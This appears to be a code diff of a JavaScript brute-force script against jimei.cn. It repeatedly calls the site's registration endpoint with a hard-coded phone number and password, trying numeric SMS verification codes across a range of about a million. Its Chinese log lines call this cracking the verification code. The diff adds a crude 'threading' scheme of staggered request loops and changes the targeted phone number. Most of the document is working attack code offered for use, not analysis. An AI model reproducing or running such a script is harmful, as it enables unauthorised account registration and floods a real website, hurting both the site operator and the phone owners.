@@ -8,6 +8,8 @@ var PL = function (tel) {
     var self = this;
     this.tel = tel;
     this.yzm = null;
+    this.thread = 10;
+    this.handleNum = 0;
     this.setYzm = function () {
         $.ajax({
             url: "http://www.jimei.cn/verifyCode",
@@ -20,11 +22,15 @@ var PL = function (tel) {
         });
     }
     this.setYzm();
+    this.setThread = function () {
+        console.info("开启" + this.thread + "个线程");
+        this.handleNum = Math.ceil(999999 / this.thread);
+        console.info("平均分配线程个数为：" + this.handleNum + "个");
+    }
+    this.setThread();
     this.pj = function (yzm) {
-
         $.ajax({
             url: "http://www.jimei.cn/isuserregiste.html",
-            //data: "password=1&pwdconfirm=1&phone=15801606686&date=" + new Date().getTime(),
             data: {
                 "phone": self.tel,
                 "password": "jimeijiaju",
@@ -34,33 +40,76 @@ var PL = function (tel) {
             type: "get",
             dataType: "json",
             success: function (data) {
-                console.log($("#sign").find(".failure").html() + "  当前index：" + yzm);
+                console.log($(data).find("#sign").find(".failure").html() + "  当前index：" + yzm);
             }
         });
-
+        console.info("破解验证码：" + yzm);
     };
     this.timer = null;
-    var i = 500000;
     this.init = function () {
+        var flag = false;
+        setTimeout(function () {
 
-        this.timer = setInterval(function () {
+            (function (i) {
+                for (var k = 1; k < self.handleNum; k++) {
+                    (function (u) {
+                        self.pj(i * 100000 + u);
+                    })(k);
+                    //console.info("k:" + i * 100000 + k)
+                }
+            })(1);
+        },200);
+        setTimeout(function () {
+            (function (i) {
+                for (var k = 1; k < self.handleNum; k++) {
+                    (function (u) {
+                        self.pj(i * 100000 + u);
+                    })(k);
+                    //console.info("k:" + i * 100000 + k)
+                }
+            })(2);
 
-            if (i == 800000) {
-                clearInterval(self.timer);
-            } else {
-                self.pj(i);
-                i++;
-            }
+        },300);
+     /*   for (var i = 1; i < this.thread; i++) {
 
-        }, 10)
 
+            (function (i) {
+                for (var k = 1; k < self.handleNum; k++) {
+                    (function (u) {
+                        self.pj(i * 100000 + u);
+                    })(k);
+
+                    //console.info("k:" + i * 100000 + k)
+                }
+            })(i);
+
+
+            console.info("启动线程：" + i);
+
+
+            /!*(function (i) {
+             var func = function (startNum) {
+             var start = startNum;
+             return function (endNum) {
+             for (var j = start; j < endNum; j++) {
+             self.pj(j);
+             }
+             }
+             }
+             func(i * 1000)((i + 1) * 10000);
+             })(i);*!/
+
+        }*/
     }
-    this.init();
+    setTimeout(function () {
+        self.init();
+    }, 3000)
+
 }
 PL.start = function (tel) {
     new PL(tel);
 }
-PL.start('13439295536');
+PL.start('15801606666');
 
 function regValidate() {
     var phone = /^[1][3,4,5,7,8][0-9]{9}$/;
